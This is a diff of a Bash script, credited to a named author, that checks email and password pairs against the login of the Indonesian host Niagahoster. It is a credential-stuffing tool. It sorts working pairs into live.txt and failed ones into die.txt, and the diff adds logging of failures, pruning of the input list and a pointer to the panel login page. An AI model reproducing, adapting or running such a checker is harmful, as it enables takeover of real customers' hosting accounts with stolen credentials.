@@ -1,7 +1,7 @@
 #!/bin/bash
-#Niagahoster.co.id Checker
-#issued on : 6 Mei 2018
-#coded By Achon666ju5t - SatriaMagnum
+#niagahoster.co.id Checker
+#issued on : 5 Mei 2018
+#coded By Achon666ju5t
 NC='\033[0m'
 GREEN='\e[38;5;82m'
 CYAN='\e[38;5;45m'
@@ -48,9 +48,13 @@ for (( i = 0; i < "${#email[@]}"; i++ )); do
     pws="${password[$i]}"
     ngecek=$(login "$user" "$pws")
     if [[ "$ngecek" = "Silakan periksa kembali detil login Anda" ]]; then
-    	printf "${RED}[Die] => $user $pws\n${NC}"
+    	printf "[$i]${RED}[Die] => $user $pws\n${NC}"
+        echo "$user | $pws" >> die.txt
     else
-    	printf "${GREEN}[Live] => $user $pws${NC}\n"
+    	printf "[$i]${GREEN}[Live] => $user $pws${NC}\n"
     	echo "$user | $pws" >> live.txt
     fi
+    grep -v "$user:$pws" $list >> $list.achonkjust
+    mv $list.achonkjust $list
 done
+echo "Silakan Login => https://panel.niagahoster.co.id/login "
